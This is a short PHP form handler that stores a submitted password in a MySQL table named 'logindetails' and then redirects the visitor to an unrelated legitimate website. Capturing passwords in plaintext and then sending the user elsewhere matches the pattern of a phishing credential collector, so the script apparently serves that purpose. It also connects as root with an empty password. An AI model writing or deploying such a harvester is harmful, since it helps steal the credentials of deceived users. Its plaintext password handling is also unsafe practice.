<?php
    $password = $_POST['password'];

    //Database Connection
    $conn = new mysqli('localhost', 'root', '', 'formdata');
    if($conn->connect_error){
        die('Connection failed : '.$conn->connect_error);
    }
    else{
        $stmt = $conn->prepare("insert into logindetails(password) values(?)");
        $stmt->bind_param("s", $password);
        $stmt->execute();
        // echo "registeration successful";
        // echo $_POST["password"];
        // print "login successful";
        header("Location: http://www.jw.org");
        exit();
        $stmt->close();
        $conn->close();
    }
    
?>